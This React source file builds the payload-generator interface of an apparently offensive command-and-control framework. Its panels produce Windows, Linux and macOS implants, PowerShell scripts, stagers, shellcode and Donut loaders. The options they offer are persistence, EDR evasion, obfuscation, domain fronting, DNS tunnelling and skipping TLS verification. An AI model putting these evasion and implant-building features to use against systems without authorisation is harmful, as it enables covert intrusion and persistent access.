import { EXEForm, PS1Form, LinuxForm, MacOSForm, StagerForm, ShellcodeForm, DonutForm } from "./types";
import { sanitizeHtml } from "@/lib/sanitize";

function PanelHeader({ bg, icon, title, subtitle }: { bg: string; icon: string; title: string; subtitle: string }) {
  return (
    <div className="flex items-center gap-x-3 mb-4 pb-4 border-b border-slate-100">
      <div className={`w-11 h-11 ${bg} rounded-xl flex items-center justify-center text-2xl`}>{icon}</div>
      <div>
        <div className="font-semibold text-base text-slate-900">{title}</div>
        <div className="text-xs text-slate-500">{subtitle}</div>
      </div>
    </div>
  );
}

export function EXEPanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: EXEForm;
  setForm: React.Dispatch<React.SetStateAction<EXEForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-orange-100" icon="🖥️" title="Windows EXE" subtitle="Native Go payload" />
      <div className="space-y-3">
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-slate-50 dark:bg-slate-700 border border-[var(--border)] focus:border-indigo-500 focus:ring-2 focus:ring-indigo-100 rounded-xl px-3 h-10 text-sm transition-all" />
        </div>
        <div className="mt-2 pt-2 border-t border-slate-100">
          <details className="group">
            <summary className="text-xs text-slate-500 cursor-pointer hover:text-indigo-600 select-none"><i className="fa-solid fa-link mr-1"></i> P2P / DNS Config (opt)</summary>
            <div className="mt-2 space-y-2">
              <div>
                <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Mode</label>
                <select value={form.p2p_mode} onChange={(e) => setForm({ ...form, p2p_mode: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
                  <option value="">Direct (HTTP/TCP)</option>
                  <option value="parent">P2P Parent</option>
                  <option value="child">P2P Child</option>
                  <option value="dns">DNS Tunnel</option>
                </select>
              </div>
              {form.p2p_mode === "child" && (
                <div>
                  <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Parent Address</label>
                  <input type="text" placeholder="tcp://192.168.1.100:4444" value={form.p2p_parent} onChange={(e) => setForm({ ...form, p2p_parent: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
                </div>
              )}
              {form.p2p_mode === "parent" && (
                <div>
                  <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Listen Address</label>
                  <input type="text" placeholder="TCP: :4444 / SMB: pipe_name" value={form.p2p_listen_addr} onChange={(e) => setForm({ ...form, p2p_listen_addr: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
                </div>
              )}
              {form.p2p_mode === "dns" && (
                <div className="space-y-2">
                  <div>
                    <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">DNS Domain</label>
                    <input type="text" placeholder="c2.example.com" value={form.dns_domain} onChange={(e) => setForm({ ...form, dns_domain: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">DNS Server</label>
                    <input type="text" placeholder="192.168.1.100" value={form.dns_server} onChange={(e) => setForm({ ...form, dns_server: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
                  </div>
                </div>
              )}
            </div>
          </details>
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.persist} onChange={(e) => setForm({ ...form, persist: e.target.checked })} id="persist-exe" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="persist-exe" className="text-sm text-slate-700">Persist</label>
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-exe" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="skip-tls-exe" className="text-sm text-[var(--text-secondary)]">Skip TLS Verify</label>
        </div>
        <div className="flex items-start gap-x-2">
          <input type="checkbox" checked={form.evasion} onChange={(e) => setForm({ ...form, evasion: e.target.checked })} id="evasion-exe" className="w-4 h-4 accent-indigo-600 mt-0.5" />
          <label htmlFor="evasion-exe" className="text-sm text-[var(--text-secondary)]">
            EDR Evasion (random sleep)
            <span className="block text-[10px] text-slate-500 dark:text-slate-400 font-normal">Set FORGEC2_EVASION=1 at runtime</span>
          </label>
        </div>
        <div className="flex items-start gap-x-2">
          <input type="checkbox" checked={form.obfuscate} onChange={(e) => setForm({ ...form, obfuscate: e.target.checked })} id="obfuscate-exe" className="w-4 h-4 accent-indigo-600 mt-0.5" />
          <label htmlFor="obfuscate-exe" className="text-sm text-[var(--text-secondary)]">
            Obfuscate (garble)
            <span className="block text-[10px] text-slate-500 dark:text-slate-400 font-normal">Strip symbols + build ID, hide literals</span>
          </label>
        </div>
        <div>
          <label className="block text-sm text-[var(--text-secondary)] mb-1">Domain Front (CDN host)</label>
          <input type="text" value={form.domain_front} onChange={(e) => setForm({ ...form, domain_front: e.target.value })} placeholder="e.g. cdn.cloudflare.com" className="w-full text-sm text-[var(--text-primary)] bg-[var(--input-bg)] rounded-xl px-3 py-2 border border-[var(--border-color)] focus:outline-none focus:ring-2 focus:ring-indigo-500/50 placeholder:text-slate-400" />
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-orange-600 hover:bg-orange-700 disabled:opacity-50 transition-colors text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate EXE</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function PS1Panel({
  form, setForm, busy, result, code, originalLen, obfuscatedLen, onGenerate, onCopy,
}: {
  form: PS1Form;
  setForm: React.Dispatch<React.SetStateAction<PS1Form>>;
  busy: boolean;
  result: string;
  code?: string;
  originalLen?: number;
  obfuscatedLen?: number;
  onGenerate: () => void;
  onCopy: (text: string) => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-blue-100" icon="📜" title="PowerShell Script" subtitle="Run in memory / fileless" />
      <div className="space-y-3">
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.persist} onChange={(e) => setForm({ ...form, persist: e.target.checked })} id="persist-ps1" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="persist-ps1" className="text-sm text-slate-700">Persist</label>
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-ps1" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="skip-tls-ps1" className="text-sm text-[var(--text-secondary)]">Skip TLS Verify</label>
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-magic"></i> Generate PS1</>}
        </button>
      </div>
      {result === "success" && code ? (
        <div className="mt-3">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs text-emerald-600 font-medium">
              <i className="fa-solid fa-check-circle"></i> Generated: {originalLen} B / Obfuscated: {obfuscatedLen} B
            </span>
            <button onClick={() => onCopy(code)} className="text-xs px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl flex items-center gap-x-1">
              <i className="fa-solid fa-copy"></i> Copy
            </button>
          </div>
          <textarea readOnly value={code} className="w-full h-48 bg-slate-900 text-emerald-400 font-mono text-xs rounded-xl p-3 border border-slate-700 resize-none" />
          <div className="mt-1 text-xs text-slate-500"><i className="fa-solid fa-info-circle"></i> Paste directly into PowerShell</div>
        </div>
      ) : result ? (
        <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />
      ) : null}
    </div>
  );
}

export function LinuxPanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: LinuxForm;
  setForm: React.Dispatch<React.SetStateAction<LinuxForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-emerald-100" icon="🐧" title="Linux ELF" subtitle="Native Go payload / amd64" />
      <div className="space-y-3">
        <div>
          <label className="block text-xs font-semibold text-slate-600 mb-1.5">Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-slate-50 dark:bg-slate-700 border border-[var(--border)] focus:border-indigo-500 rounded-xl px-3 h-10 text-sm" />
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.persist} onChange={(e) => setForm({ ...form, persist: e.target.checked })} id="persist-linux" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="persist-linux" className="text-sm text-slate-700">Persist</label>
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-linux" className="w-4 h-4 accent-indigo-600 ml-3" />
          <label htmlFor="skip-tls-linux" className="text-sm text-[var(--text-secondary)]">Skip TLS</label>
          <input type="checkbox" checked={form.obfuscate} onChange={(e) => setForm({ ...form, obfuscate: e.target.checked })} id="obfuscate-linux" className="w-4 h-4 accent-indigo-600 ml-3" />
          <label htmlFor="obfuscate-linux" className="text-sm text-[var(--text-secondary)]">Obfuscate</label>
        </div>
        <div>
          <label className="block text-sm text-[var(--text-secondary)] mb-1">Domain Front (CDN host)</label>
          <input type="text" value={form.domain_front} onChange={(e) => setForm({ ...form, domain_front: e.target.value })} placeholder="e.g. cdn.cloudflare.com" className="w-full text-sm text-[var(--text-primary)] bg-[var(--input-bg)] rounded-xl px-3 py-2 border border-[var(--border-color)] focus:outline-none focus:ring-2 focus:ring-indigo-500/50 placeholder:text-slate-400" />
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate ELF</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function MacOSPanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: MacOSForm;
  setForm: React.Dispatch<React.SetStateAction<MacOSForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-purple-100" icon="🍏" title="macOS Binary" subtitle="Native Go payload / amd64" />
      <div className="space-y-3">
        <div>
          <label className="block text-xs font-semibold text-slate-600 mb-1.5">Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-slate-50 dark:bg-slate-700 border border-[var(--border)] focus:border-indigo-500 rounded-xl px-3 h-10 text-sm" />
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.persist} onChange={(e) => setForm({ ...form, persist: e.target.checked })} id="persist-macos" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="persist-macos" className="text-sm text-slate-700">Persist</label>
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-macos" className="w-4 h-4 accent-indigo-600 ml-3" />
          <label htmlFor="skip-tls-macos" className="text-sm text-[var(--text-secondary)]">Skip TLS</label>
          <input type="checkbox" checked={form.obfuscate} onChange={(e) => setForm({ ...form, obfuscate: e.target.checked })} id="obfuscate-macos" className="w-4 h-4 accent-indigo-600 ml-3" />
          <label htmlFor="obfuscate-macos" className="text-sm text-[var(--text-secondary)]">Obfuscate</label>
        </div>
        <div>
          <label className="block text-sm text-[var(--text-secondary)] mb-1">Domain Front (CDN host)</label>
          <input type="text" value={form.domain_front} onChange={(e) => setForm({ ...form, domain_front: e.target.value })} placeholder="e.g. cdn.cloudflare.com" className="w-full text-sm text-[var(--text-primary)] bg-[var(--input-bg)] rounded-xl px-3 py-2 border border-[var(--border-color)] focus:outline-none focus:ring-2 focus:ring-indigo-500/50 placeholder:text-slate-400" />
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate macOS</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function StagerPanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: StagerForm;
  setForm: React.Dispatch<React.SetStateAction<StagerForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-purple-100" icon="📦" title="Windows Stager" subtitle="XOR loader + remote implant" />
      <div className="space-y-4">
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Output Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm" />
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-stager" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="skip-tls-stager" className="text-sm text-slate-700">Skip TLS Verify</label>
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 transition-colors text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate Loader</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function StagerLinuxPanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: StagerForm;
  setForm: React.Dispatch<React.SetStateAction<StagerForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-teal-100" icon="📦" title="Linux Stager" subtitle="XOR loader + remote implant" />
      <div className="space-y-4">
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Output Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm" />
        </div>
        <div className="flex items-center gap-x-2">
          <input type="checkbox" checked={form.skip_tls} onChange={(e) => setForm({ ...form, skip_tls: e.target.checked })} id="skip-tls-stager-linux" className="w-4 h-4 accent-indigo-600" />
          <label htmlFor="skip-tls-stager-linux" className="text-sm text-slate-700">Skip TLS Verify</label>
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-teal-600 hover:bg-teal-700 disabled:opacity-50 transition-colors text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate Loader</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function ShellcodePanel({
  form, setForm, busy, result, onGenerate,
}: {
  form: ShellcodeForm;
  setForm: React.Dispatch<React.SetStateAction<ShellcodeForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-amber-100" icon="💻" title="Raw Shellcode" subtitle="WinExec + PowerShell" />
      <div className="space-y-4">
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Command</label>
          <input type="text" value={form.command} onChange={(e) => setForm({ ...form, command: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm" />
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-amber-600 hover:bg-amber-700 disabled:opacity-50 transition-colors text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate Shellcode</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}

export function DonutPanel({
  form, setForm, busy, result, onGenerate, fileRef,
}: {
  form: DonutForm;
  setForm: React.Dispatch<React.SetStateAction<DonutForm>>;
  busy: boolean;
  result: string;
  onGenerate: () => void;
  fileRef: React.RefObject<HTMLInputElement | null>;
}) {
  return (
    <div className="ui-card p-5 shadow-sm hover:shadow-md transition-shadow">
      <PanelHeader bg="bg-orange-100" icon="🍩" title="Donut Loader" subtitle=".NET → PIC Shellcode" />
      <div className="space-y-4">
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">.NET Assembly (EXE/DLL)</label>
          <input ref={fileRef} type="file" accept=".exe,.dll" onChange={(e) => setForm({ ...form, assembly: e.target.files?.[0] || null })} className="w-full text-sm file:mr-3 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-sm file:font-semibold file:bg-indigo-50 file:text-indigo-700 hover:file:bg-indigo-100" />
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Arch</label>
          <select value={form.arch} onChange={(e) => setForm({ ...form, arch: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm">
            <option value="amd64">x64 (amd64)</option>
            <option value="x86">x86</option>
          </select>
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Class (opt)</label>
          <input type="text" placeholder="Leave blank for Main" value={form.class} onChange={(e) => setForm({ ...form, class: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Method (opt)</label>
          <input type="text" placeholder="Main" value={form.method} onChange={(e) => setForm({ ...form, method: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Args (opt)</label>
          <input type="text" placeholder="" value={form.args} onChange={(e) => setForm({ ...form, args: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm font-mono text-xs" />
        </div>
        <div>
          <label className="block text-xs font-semibold text-slate-600 dark:text-slate-300 mb-1.5">Output Filename</label>
          <input type="text" value={form.filename} onChange={(e) => setForm({ ...form, filename: e.target.value })} className="w-full bg-[var(--card-bg)] border border-[var(--border)] focus:border-indigo-500 rounded-2xl px-4 h-11 text-sm" />
        </div>
        <button type="button" onClick={onGenerate} disabled={busy} className="w-full h-10 bg-orange-600 hover:bg-orange-700 disabled:opacity-50 transition-colors text-white font-medium rounded-xl flex items-center justify-center gap-x-2">
          {busy ? <><i className="fa-solid fa-spinner fa-spin"></i> Generating...</> : <><i className="fa-solid fa-download"></i> Generate Donut</>}
        </button>
      </div>
      {result && <div className="mt-3" dangerouslySetInnerHTML={{ __html: sanitizeHtml(result) }} />}
    </div>
  );
}


